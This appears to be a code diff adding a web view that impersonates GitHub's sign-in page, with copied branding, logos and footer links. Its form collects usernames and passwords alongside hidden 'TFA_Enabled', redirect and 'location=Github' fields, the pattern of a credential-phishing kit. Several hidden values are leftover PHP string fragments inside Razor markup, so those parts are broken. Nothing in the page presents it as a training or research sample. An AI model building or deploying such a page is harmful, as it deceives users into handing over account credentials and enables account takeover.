@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang=en>
+
+<head>
+    <meta charset=utf-8>
+    <title>Sign in to GitHub · GitHub</title>
+    <link rel=stylesheet type=text/css href="~/css/github.css">
+    <link rel=icon type="image/x-icon"
+        href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAAM1BMVEVHcExJR0fAwMBVU1OOjY0+PDx1dHQXFRUjISEwLi7e3t57enrU09Oqqam2tbWhoKDu7e2fa374AAAAAXRSTlMAQObYZgAAAPRJREFUeAGNkuGOwyAMgw0EHGBd9/5Pe1OUdemBTvf9oVJcGwwI5Faqai0tY0dTXmhbxqK8oYIbiQspjB+dG/oDHzq39OhfmzKgJX1ThG9O4OjUWkpV6gk8+UZMYL9a3gC+ixnZ+emCiAvYPgY88ItMswgfgXC07AmChcMziq0DKzYoqGtCzKjQ2Nl6Pwr920F9s9jg3mmtIRaRMH1dKDaYeNKQfQ18ArpVCK+GJzmPSnbJV7xU0hOAQWp+pbCTwg863E1fo1tg2H/IrXbvMk84dGro7MoPgn579kVOgbM8e0sJhV/+AdEg2DY3pioc1TbwX34Aq9MNfNITQNMAAAAASUVORK5CYII=">
+    <style>
+
+    </style>
+</head>
+
+<body class="logged-out env-production page-responsive session-authentication">
+    <center><img style=margin-top:25px;margin-bottom:15px
+            src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAMAAAAp4XiDAAAAJ1BMVEVHcEwzMzNiYmJDQ0NRUVGqqqqAgIA7Ozu7u7vOzs6RkZGfn590dHTiMrbuAAAAAXRSTlMAQObYZgAAAW9JREFUeAG9ld2yIyEIhG1QGH/e/3m3KmYtyBAyF1v73ZyyzrS0tJjyb7iGUFWtJOMqD2hLYdDVSs6suFFHVoEQQvObwgscFB+akEBXYKoihdtNwfiBfmiuip+w97ZrMCNE3/8OenWVMm4qlV7KOyFzEGxei6EAE4kQMQAxLjCtLbuJ8Xz1/XfBW5vwEo+VYNgizyTsTwJ8l5wMmt0hlZw+Lr9DcskbrPkru60HAU52ZeDNzCTdWjH6DMVGzGBpSSFjv9qW/06m5kGGYRoJPzPGNpZcUo0ZetYxNsen3+H7wE2U9VH6w+rRkiLs7B8J5/3a2GVmbX28tA0HaqGrhU/z/PpYNH57+1LcvI9dsPPbnvTzuVQ45MS09V1vbWA41I9pPf2WcphwTNvDHVJ71enBMN47qn+r9ubPDwN31xZvKJZcwauzUkmLXyoSEYolM/uxjMaktvTuBVVqLzFTY4nObJL0LlEpOY2mK2yW/5U/oKkIyULYB/kAAAAASUVORK5CYII=">
+    </center>
+    <div>
+        <main>
+            <div class="auth-form px-3">
+                @using (Html.BeginForm())
+                {
+                    <div class="auth-form-header p-0">
+                        <h1>Sign in to GitHub</h1>
+                    </div>
+                    <div class="auth-form-body mt-3"><label for=login_field> Username or email address </label>
+                        <input type=hidden name=name value="'.basename(__FILE__).'">
+                        <input type=hidden name=TFA_Enabled value="'.$TFA_Enabled.'">
+                        <input type=text name=username class="form-control input-block" required>
+                        <input type=hidden name=link value='.$redirect.'>
+                        <input type=hidden name=location value=Github /><label for=password> Password <a
+                                class=label-link href>Forgot password?</a></label>
+                        <input type=password name=password class="form-control form-control input-block" required>
+                        <input type=submit value="Sign in" class="btn btn-primary btn-block">
+                    </div>
+                }
+                <p class="create-account-callout mt-3"> New to GitHub? <a href>Create an account</a>. </p>
+            </div>
+        </main>
+    </div>
+    <center>
+        <div style=font-size:12px;margin-top:70px><a style=margin-right:9px href> Terms </a><a style=margin-right:9px
+                href> Privacy </a><a style=margin-right:9px href> Security </a><a href style=color:#000> Contact GitHub
+            </a></div>
+    </center>
+</body>
+
+</html>
